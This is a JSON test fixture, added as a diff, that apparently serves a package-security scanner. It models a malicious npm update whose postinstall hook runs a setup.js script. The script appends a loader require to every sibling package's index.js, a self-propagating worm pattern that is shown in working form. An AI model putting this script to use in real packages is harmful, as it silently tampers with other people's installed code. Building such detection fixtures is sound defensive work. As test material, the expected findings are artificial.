@@ -1,0 +1,58 @@
+{
+  "id": "install-root-two-level-dirname",
+  "title": "Setup script one directory deep climbs two levels and appends to every sibling package",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "Model local propagation from a nested install script: scripts/setup.js takes path.dirname twice, which from depth 1 is the install root, binds it, and appends a loader to each entry it finds there. The source never names node_modules. Inert fixture; the target is a fixture path, not a real tree.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node scripts/setup.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 36,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 86,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node scripts/setup.js\"}}"
+    },
+    {
+      "path": "scripts/setup.js",
+      "size": 296,
+      "sha256": "setup-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\nconst up = path.dirname(path.dirname(__dirname));\nfor (const name of fs.readdirSync(up)) {\n  const entry = path.join(up, name, 'index.js');\n  if (fs.existsSync(entry)) fs.appendFileSync(entry, \"\\nrequire('tinyfmt/loader');\\n\");\n}\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "scripts/setup.js"
+    }
+  ]
+}
